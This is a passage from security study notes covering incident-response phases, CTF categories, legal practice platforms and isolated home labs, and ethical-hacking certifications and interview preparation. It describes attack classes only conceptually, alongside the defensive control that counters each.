**Incident response basics — Definition:** a structured incident response process — **preparation** (having a documented plan before an incident occurs, not improvised during one), **detection & analysis** (recognizing that an incident is actually occurring and understanding its scope), **containment** (limiting further damage — isolating an affected system from the network), **eradication & recovery** (removing the attacker's access and restoring normal, verified-clean operation), and **post-incident review** (the same "conduct a blameless retrospective" discipline valuable across essentially every engineering discipline, applied here specifically to security incidents) — a mature organization treats a security incident the same way this workspace's own broader engineering-discipline notes treat any serious production incident: with a structured, rehearsed process rather than improvised, panicked reaction.

**Why every offensive technique maps to a specific defensive control — Definition:** the consistent structure of this entire file — reconnaissance (section 3) countered by minimizing publicly exposed information and monitoring for it; scanning (section 4) countered by network segmentation and IDS/IPS (section 7); injection/XSS (section 5) countered by parameterized queries and output encoding; password attacks (section 8) countered by hashing/salting, rate limiting, and MFA; social engineering (section 11) countered by awareness training — is deliberate: understanding offensive technique is genuinely most valuable precisely **because** it directly informs which defensive control actually matters and why, which is the entire practical justification for a defender studying offensive technique at all, rather than the two being treated as entirely separate disciplines.

## 15. CTF Practice & Legal Practice Environments

**Capture The Flag competitions — how they work, common categories — Definition:** a **CTF (Capture The Flag)** is a competitive exercise where participants solve security challenges to find a hidden "flag" (a specific string proving successful completion) — common categories include **web** (exploiting deliberately-vulnerable web applications, directly exercising section 5–6's skills), **crypto** (breaking intentionally weak/misused cryptography, section 13), **pwn/binary exploitation** (memory-safety exploitation, section 9's buffer-overflow concepts), **reverse engineering** (understanding compiled binaries without source code), and **forensics** (analyzing captured data/artifacts to reconstruct what happened, directly related to section 14's incident-response skills) — CTFs provide genuinely legal, structured, skill-building practice against deliberately vulnerable targets, with no authorization ambiguity at all, since the entire platform exists specifically to be attacked.

**Legal practice platforms — Definition:** **HackTheBox** and **TryHackMe** provide structured, guided, and fully legal practice environments with intentionally vulnerable machines spanning a huge range of difficulty and technique; **PortSwigger's Web Security Academy** (created by Burp Suite's makers) provides free, extremely thorough, hands-on web application security labs directly covering every OWASP Top 10 category (section 5) with live, exploitable practice environments; **OWASP Juice Shop** is a deliberately vulnerable web application (deployable locally, directly relevant to this workspace's own Docker-based local-environment setup skills) specifically designed for hands-on OWASP Top 10 practice — every one of these is explicitly designed and authorized to be attacked, making them the correct, legal, and genuinely educational venue for hands-on practice, as opposed to testing any real, non-designated target.

**Building a home lab safely and legally — Definition:** a personal practice lab — virtual machines (deliberately vulnerable OS images, or Docker containers running vulnerable applications, Docker-Kubernetes notes) running in an **isolated network** (a virtualization platform's host-only/internal network mode, specifically preventing the lab's traffic from ever reaching the actual internet or a home network's other devices) — lets a learner practice scanning, exploitation, and post-exploitation techniques (sections 4, 8–9) against genuinely vulnerable systems entirely under their own control and legal ownership, with network isolation providing a technical safeguard against accidentally scanning/attacking anything outside the lab.

**Why practicing only on authorized/designated targets is non-negotiable — Definition:** this entire section's practical guidance distills to one non-negotiable rule, restated directly from section 1: never run any offensive technique from this file against any system you don't own or don't have **explicit, written** authorization to test, regardless of how confident you are the target is vulnerable, how "harmless" the specific technique seems, or how easy it would be to simply try — the legal and professional consequences of unauthorized access are severe and entirely disconnected from intent, and the platforms/labs described in this section exist specifically so that no learner ever has a legitimate reason to test against an unauthorized target at all.

## 16. Ethical Hacking Certifications & Interview Prep

**Certification landscape: CEH, OSCP, Security+ — Definition:** **CompTIA Security+** is a broad, foundational, largely knowledge-based (multiple-choice) certification covering general security concepts — a common, accessible entry point; **CEH (Certified Ethical Hacker)** similarly covers a broad range of tools/techniques at a largely conceptual level; **OSCP (Offensive Security Certified Professional)** is a substantially more rigorous, hands-on, practical exam — candidates must actually compromise real (deliberately vulnerable) machines within a timed, proctored exam and produce a professional-quality report (directly exercising section 2's reporting-phase emphasis) — widely regarded within the industry as demonstrating genuine, practical skill in a way a purely knowledge-based exam cannot, and correspondingly more respected/sought-after for actual penetration-testing roles specifically because of that hands-on rigor.

**Common interview questions** — walk through the phases of a penetration test methodology (section 2); explain the difference between a false positive and a false negative in vulnerability scanning, and why manual testing still matters (section 6); explain how parameterized queries actually prevent SQL injection at a structural level, not just by filtering (section 5); what's the difference between hashing and encryption, and why does that distinction matter for password storage specifically (section 13); explain defense in depth with a concrete example (section 14); walk through responsible disclosure and why it matters (section 1); given a scenario, explain what phase of the CVE/patching lifecycle makes an organization vulnerable, and what would have prevented it (section 9).

**Building a portfolio through CTFs and responsible disclosure — Definition:** a genuine, demonstrable portfolio in this field is built through consistent CTF participation (section 15, with platforms like HackTheBox providing rankings/achievements that serve as concrete, verifiable evidence of skill), documented write-ups of solved challenges (demonstrating not just that a challenge was solved, but the actual reasoning process — directly the same "explain your reasoning, not just your final answer" principle already emphasized generally in the DSA notes' interview-prep section), and legitimate bug bounty participation (section 1) within properly scoped programs — a meaningfully different, more concretely verifiable path to demonstrating capability than in many other engineering disciplines, given how directly and publicly this skill set can be exercised on fully legal, designated platforms.

**Where this file connects back to the rest of this workspace — Definition:** this file's OWASP Top 10 coverage (section 5) is the direct, adversarial-perspective counterpart to the secure-coding practices already built into this workspace's Node.js, Java Backend, Python Backend, and NestJS notes' authentication/authorization sections; its cryptography coverage (section 13) directly extends the Communication notes' TLS discussion; its cloud/container security coverage (section 12) directly extends the AWS and Docker-Kubernetes notes — the genuinely productive way to use this file is not in isolation, but specifically **alongside** those other notes, reading each vulnerability class here against the corresponding defensive code/configuration pattern already documented elsewhere in this workspace, since understanding both sides of the same coin together is what this entire file's repeated "offense informs defense" framing has been building toward throughout.
